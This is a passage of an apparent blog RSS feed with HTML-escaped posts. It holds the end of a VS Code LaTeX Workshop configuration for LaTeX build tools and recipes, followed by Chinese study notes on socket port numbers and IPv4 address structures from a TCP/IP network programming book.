style=&#34;color:#e6db74&#34;&gt;&amp;#34;latex-workshop.intellisense.package.enabled&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;latex-workshop.message.error.show&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;latex-workshop.message.warning.show&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;latex-workshop.latex.tools&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; [&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;xelatex&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;command&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;xelatex&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;args&amp;#34;&lt;/span&gt;: [&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-synctex=1&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-interaction=nonstopmode&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-file-line-error&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%DOCFILE%&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        },&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pdflatex&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;command&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pdflatex&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;args&amp;#34;&lt;/span&gt;: [&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-synctex=1&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-interaction=nonstopmode&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-file-line-error&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%DOCFILE%&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        },&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;latexmk&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;command&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;latexmk&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;args&amp;#34;&lt;/span&gt;: [&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-synctex=1&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-interaction=nonstopmode&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-file-line-error&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-pdf&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-outdir=%OUTDIR%&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%DOCFILE%&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        },&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bibtex&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;command&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bibtex&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;args&amp;#34;&lt;/span&gt;: [&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%DOCFILE%&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ]&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;latex-workshop.latex.recipes&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; [&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;XeLaTeX&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;tools&amp;#34;&lt;/span&gt;: [&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;xelatex&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        },&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PDFLaTeX&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;tools&amp;#34;&lt;/span&gt;: [&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pdflatex&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        },&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;BibTeX&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;tools&amp;#34;&lt;/span&gt;: [&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bibtex&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        },&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LaTeXmk&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;tools&amp;#34;&lt;/span&gt;: [&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;latexmk&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        },&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;xelatex -&amp;gt; bibtex -&amp;gt; xelatex*2&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;tools&amp;#34;&lt;/span&gt;: [&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;xelatex&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bibtex&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;xelatex&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;xelatex&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        },&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pdflatex -&amp;gt; bibtex -&amp;gt; pdflatex*2&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;tools&amp;#34;&lt;/span&gt;: [&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pdflatex&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bibtex&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pdflatex&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pdflatex&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        },&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ]&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;latex-workshop.latex.clean.fileTypes&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; [&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*.aux&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*.bbl&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*.blg&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*.idx&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*.ind&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*.lof&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*.lot&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*.out&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*.toc&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*.acn&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*.acr&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*.alg&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*.glg&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*.glo&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*.gls&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*.ist&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*.fls&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*.log&amp;#34;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*.fdb_latexmk&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ]&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;latex-workshop.latex.autoClean.run&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;onFailed&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;latex-workshop.latex.recipe.default&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;lastUsed&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;latex-workshop.view.pdf.internal.synctex.keybinding&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;double-click&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;sumatrapdf-安装设置&#34;&gt;SumatraPDF 安装设置&lt;/h3&gt;&#xA;&lt;p&gt;因为vscode内置的pdf查看器不太好用，可以配置别的pdf查看器。具体配置参考&lt;a href=&#34;https://zhuanlan.zhihu.com/p/166523064?utm_id=0&#34;&gt;Visual Studio Code (vscode)配置LaTeX - 知乎&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>TCP、IP网络编程第三章笔记</title>
      <link>//localhost:64783/posts/tcpip%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%89%E7%AB%A0%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Wed, 15 Nov 2023 20:09:07 +0800</pubDate>
      <guid>//localhost:64783/posts/tcpip%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%89%E7%AB%A0%E7%AC%94%E8%AE%B0/</guid>
      <description>&lt;h2 id=&#34;31-分配给套接字的ip地址与端口号&#34;&gt;3.1 分配给套接字的IP地址与端口号&lt;/h2&gt;&#xA;&lt;h3 id=&#34;网络地址&#34;&gt;网络地址&lt;/h3&gt;&#xA;&lt;p&gt;略&lt;/p&gt;&#xA;&lt;h2 id=&#34;用于区分套接字的端口号&#34;&gt;用于区分套接字的端口号&lt;/h2&gt;&#xA;&lt;p&gt;IP用于区分计算机,只要有IP地址就能向目标主机传输数据,但仅凭这些无法传输给最终的应用程序。假设各位欣赏视频的同时在网上冲浪,这时至少需要1个接收视频数据的套接字和1 个接收网页信息的套接字。问题在于如何区分二者。简言之,传输到计算机的网络数据是发给播放器,还是发送给浏览器?&lt;/p&gt;&#xA;&lt;p&gt;若想接收多台计算机发来的数据,则需要相应个数的套接字。那如何区分这些套接字呢?&#xA;计算机中一般配有NIC(Network Interface Card,网络接口卡)数据传输设备。通过NIC向计算机内部传输数据时会用到IP。操作系统负责把传递到内部的数据适当分配给套接字,利用端口号。也就是说,通过NIC接收的数据内有端口号,操作系统正是参考此端口号把数据传输给相应端口的套接字&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.5q51v4z8i4n4.webp&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;端口号就是在同一操作系统内为区分不同套接字而设置的,因此无法将1个端口号分配给不同套接字。&#xA;另外,端口号由16位构成 可分配的端口号范围是&lt;strong&gt;0-65535&lt;/strong&gt;。但&lt;strong&gt;0-1023&lt;/strong&gt;是&lt;strong&gt;知名端口(Well-known PORT)&lt;/strong&gt;,一般分配给特定应用程序,所以应当分配此范围之外的值。另外,虽然端口号不能重复,&lt;strong&gt;但TCP套接字和UDP套接字不会共用端口号,所以允许重复&lt;/strong&gt;。例如:如果某TCP 套接字使用9190号端口,则其他TCP套接字就无法使用该端口号,但UDP套接字可以使用。&#xA;总之,数据传输目标地址同时包含IP地址和端口号,只有这样,数据才会被传输到最终的目的应用程序(应用程序套接字)。&lt;/p&gt;&#xA;&lt;h2 id=&#34;32&#34;&gt;3.2&lt;/h2&gt;&#xA;&lt;p&gt;应用程序中使用的IP地址和端口号以结构体的形式给出了定义。本节将以IPv4为中心,围绕此结构体讨论目标地址的表示方法。&lt;/p&gt;&#xA;&lt;h3 id=&#34;表示ipv4的结构体&#34;&gt;表示IPv4的结构体&lt;/h3&gt;&#xA;&lt;p&gt;填写地址信息时应以如下提问为线索进行&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;口 问题1：“采用哪一种地址族？”&#xA;口 答案1：“基于IPv4的地址族。”&#xA;口问题2：“IP地址是多少？”&#xA;口答案2：“211.204.214.76。”&#xA;口 问题3：“端口号是多少？”&#xA;口 答案3：“2048。”&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h4 id=&#34;c&#34;&gt;C&lt;/h4&gt;&#xA;&lt;p&gt;C语言中IPv4结构体定义为如下形态&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; 